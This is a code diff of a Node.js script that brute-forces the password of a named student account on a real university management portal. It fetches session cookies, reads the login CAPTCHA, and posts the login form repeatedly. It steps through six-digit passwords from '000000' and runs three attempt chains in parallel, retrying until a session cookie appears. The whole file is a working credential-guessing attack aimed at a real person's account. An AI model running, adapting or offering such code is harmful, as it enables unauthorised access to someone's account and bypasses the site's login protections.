@@ -1,27 +1,29 @@
 import fetch from "node-fetch"
 import FormData from "form-data"
 import cheerio from "cheerio"
+
 const log = console.log
 const baseUrl = "http://mis.sse.ustc.edu.cn/"
 const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g
 
-const cookieJar:string[] = []
 let view_state = ""
 let username = "sa18225541"
 let password = "000000"
 const app =()=>{
   fetch(baseUrl)
-.then(
-  async result => {
+  .then(
+    async result => {
+      if(parseInt(password)>999999){
+        return
+      }
+    const cookieJar:string[] = []
     const sessionId = (result.headers.get("set-cookie")||"").split(";")[0]
     cookieJar.push(sessionId) 
     const body = await result.text();
     const $ = cheerio.load(body)
     view_state = $("#__VIEWSTATE").val()
-    log("before" + Date.now());
     const imgUrl = body.match(pattern) || [""];
     const url = baseUrl + imgUrl[0].replace("&amp;", "&");
-    log("after" + Date.now());
     const r = await fetch(url,{
       headers:{
         "cookie":cookieJar.join(";")
@@ -38,7 +40,7 @@ const app =()=>{
     log("sum:",sum)
     log("session",cookieJar)
     const formData = new FormData()
-     
+    
     formData.append("__EVENTTARGET","winLogin$sfLogin$ContentPanel1$btnLogin")
     formData.append("__VIEWSTATE",view_state)
     formData.append("winLogin$sfLogin$txtUserLoginID",username)
@@ -58,25 +60,18 @@ const app =()=>{
     // formData.append('WndModal_Collapsed',"false")
     // formData.append('X_STATE','e30=')
     // formData.append('X_AJAX',"true")
-
-  const login = await fetch(baseUrl+"default.aspx",{
+    
+    const login = await fetch(baseUrl+"default.aspx",{
       method:"post",
       headers:{
         cookie:cookieJar.join(";")
       },
       body:formData
     })
-  const iflysse = (login.headers.get("set-cookie")||"").split(";")[0]
+    const iflysse = (login.headers.get("set-cookie")||"").split(";")[0]
   if(iflysse.length === 0 ){
     log("failed ","password: ", password)
-    password = ""+(parseInt(password)+1)
-    if(password.length<6){
-      log("len",password.length)
-      const len = password.length
-      for(let i=0;i<6-len;i++){
-        password = 0+password
-      }
-    }
+    increase()
     cookieJar.length = 0
     app()
   }else{
@@ -84,12 +79,24 @@ const app =()=>{
     return
   }
   cookieJar.push(iflysse)
-  log("")
 })
-
 .catch((err) => {
   log(err)
   app()
 })
 };
-app()
+
+function increase(){
+  password = ""+(parseInt(password)+1)
+  if(password.length<6){
+    const len = password.length
+    for(let i=0;i<6-len;i++){
+      password = 0+password
+    }
+  }
+}
+
+for(let i=0;i<3;i++){
+  app()
+  increase()
+}
